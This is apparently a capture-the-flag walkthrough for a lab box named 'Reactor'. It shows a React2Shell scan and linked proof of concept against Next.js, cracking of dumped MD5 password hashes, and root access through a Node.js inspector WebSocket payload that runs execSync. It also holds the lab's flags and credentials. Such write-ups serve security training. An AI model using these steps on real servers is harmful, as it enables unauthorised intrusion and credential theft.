port 22 ssh and 3000(http) open
# User

NextJS 15.0.3 -> REACT2SHELL???

```
└─$ python3 scanner.py -u http://10.129.2.134:3000/

brought to you by assetnote

[*] Loaded 1 host(s) to scan
[*] Using 10 thread(s)
[*] Timeout: 10s
[*] Using RCE PoC check
[!] SSL verification disabled

[VULNERABLE] http://10.129.2.134:3000/ - Status: 303

```
CONFIRMED!!!

I used this [poc](https://github.com/timsonner/React2Shell-CVE-2025-55182/)
Got a shell!
`sqlite3 reactor.db`
```
1|admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb
2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb
```
`engineer`'s plaintext password
```
|39d97110eafe2a9a68639812cd271e8e|md5|reactor1|
```
engineer:reactor1
```
 ____  _____    _    ____ _____ ___  ____  
|  _ \| ____|  / \  / ___|_   _/ _ \|  _ \ 
| |_) |  _|   / _ \| |     | || | | | |_) |
|  _ <| |___ / ___ \ |___  | || |_| |  _ < 
|_| \_\_____/_/   \_\____| |_| \___/|_| \_\

    ReactorWatch Core Monitoring System
    Nuclear Dynamics Corp. - Site 7
    
    AUTHORIZED PERSONNEL ONLY
Last login: Sat May 23 19:51:01 2026 from 10.10.14.76
engineer@reactor:~$ ls
user.txt
engineer@reactor:~$ cat user.txt
ffbdbfbd5db18462e5fc4eaf3f7773aa
```

# Root

```
engineer@reactor:~$ netstat -tunap
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.54:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:9229          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:9229          127.0.0.1:53980         ESTABLISHED -                   
```

ssh tunneling
`ssh -L 9229:127.0.0.1 engineer@10.129.2.134`


```
└─$ node -e "
const WebSocket = require('ws');
const ws = new WebSocket('ws://127.0.0.1:9229/f3ca27e9-70f9-4f8d-a851-034462ffcd51');
ws.on('open', () => {
  ws.send(JSON.stringify({
    id: 1,
    method: 'Runtime.evaluate',
    params: {
      expression: 'process.mainModule.require(\"child_process\").execSync(\"cat /root/root.txt\").toString()'
    }
  }));
});
ws.on('message', (data) => { console.log(data.toString()); ws.close(); });
"
{"id":1,"result":{"result":{"type":"string","value":"054e996240c1e8da95d17958f47322ff\n"}}}

```
